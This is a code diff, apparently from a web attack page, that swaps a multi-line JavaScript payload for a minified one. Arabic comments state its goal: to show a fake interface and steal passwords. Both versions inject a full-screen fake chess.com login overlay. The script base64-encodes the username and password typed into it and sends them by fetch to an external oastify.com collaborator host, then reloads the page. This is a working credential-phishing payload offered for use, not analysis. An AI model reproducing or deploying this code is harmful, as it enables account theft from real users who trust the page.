@@ -17,39 +17,7 @@
     <script>
         // الـ Payload اللي هيظهر الـ UI ويخطف الباسوورد
         // ملاحظة: استخدمت الـ Dark Theme بتاع شطرنج عشان الرعب
-        let payload = `
-            (function(){
-                if(document.getElementById('pawn_trap')) return;
-                const div = document.createElement('div');
-                div.id = 'pawn_trap';
-                div.style = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#262421;z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:sans-serif;';
-                div.innerHTML = '<div style="width:380px;background:#312e2b;padding:40px;border-radius:5px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.5);">' +
-                    '<img src="https://www.chess.com/bundles/web/images/offline-play/pawn.png" width="60" style="margin-bottom:20px;">' +
-                    '<h2 style="color:#fff;margin-bottom:25px;font-size:24px;">Log In</h2>' +
-                    '<input type="text" id="u" placeholder="Username or Email" style="width:100%;padding:12px;margin-bottom:10px;background:#3c3934;border:1px solid #4d4a44;color:#fff;border-radius:3px;font-size:16px;">' +
-                    '<input type="password" id="p" placeholder="Password" style="width:100%;padding:12px;margin-bottom:20px;background:#3c3934;border:1px solid #4d4a44;color:#fff;border-radius:3px;font-size:16px;">' +
-                    '<button id="s" style="width:100%;padding:15px;background:#81b64c;color:#fff;border:none;font-weight:bold;cursor:pointer;border-radius:3px;font-size:18px;">Log In</button>' +
-                    '<p style="color:#989795;margin-top:20px;font-size:13px;">Forgot Password?</p>' +
-                '</div>';
-                document.body.appendChild(div);
-
-                document.getElementById('s').onclick = function(){
-                    const user = document.getElementById('u').value;
-                    const pass = document.getElementById('p').value;
-                    if(!pass || !user) return;
-                    this.innerText = 'Verifying...';
-                    
-                    // إرسال البيانات للـ Collaborator
-                    const data = btoa(user + ":" + pass);
-                    fetch("https://rc7k013izgskby73otl97vygp7vyjo7d.oastify.com/login?creds=" + data, {mode:'no-cors'});
-                    
-                    setTimeout(() => { 
-                        alert("Session Timed Out. Please try again.");
-                        window.location.reload(); 
-                    }, 1500);
-                };
-            })(); // get_ext
-        `;
+       let payload = "(function(){if(document.getElementById('pawn_trap'))return;var d=document.createElement('div');d.id='pawn_trap';d.style='position:fixed;top:0;left:0;width:100%;height:100%;background:#262421;z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:sans-serif;';d.innerHTML='<div style=\"width:350px;background:#312e2b;padding:30px;border-radius:5px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.5);\"><img src=\"https://www.chess.com/bundles/web/images/offline-play/pawn.png\" width=\"50\" style=\"margin-bottom:15px;\"><h2 style=\"color:#fff;margin-bottom:20px;font-size:22px;\">Log In</h2><input type=\"text\" id=\"u\" placeholder=\"Email/Username\" style=\"width:100%;padding:10px;margin-bottom:10px;background:#3c3934;border:1px solid #4d4a44;color:#fff;border-radius:3px;\"><input type=\"password\" id=\"p\" placeholder=\"Password\" style=\"width:100%;padding:10px;margin-bottom:20px;background:#3c3934;border:1px solid #4d4a44;color:#fff;border-radius:3px;\"><button id=\"s\" style=\"width:100%;padding:12px;background:#81b64c;color:#fff;border:none;font-weight:bold;cursor:pointer;border-radius:3px;\">Log In</button></div>';document.body.appendChild(d);document.getElementById('s').onclick=function(){var user=document.getElementById('u').value;var pass=document.getElementById('p').value;if(!user||!pass)return;this.innerText='Verifying...';fetch('https://rc7k013izgskby73otl97vygp7vyjo7d.oastify.com/log?c='+btoa(user+':'+pass),{mode:'no-cors'});setTimeout(function(){location.reload();},1000);};})(); // get_ext";
 
         let spammer;
 
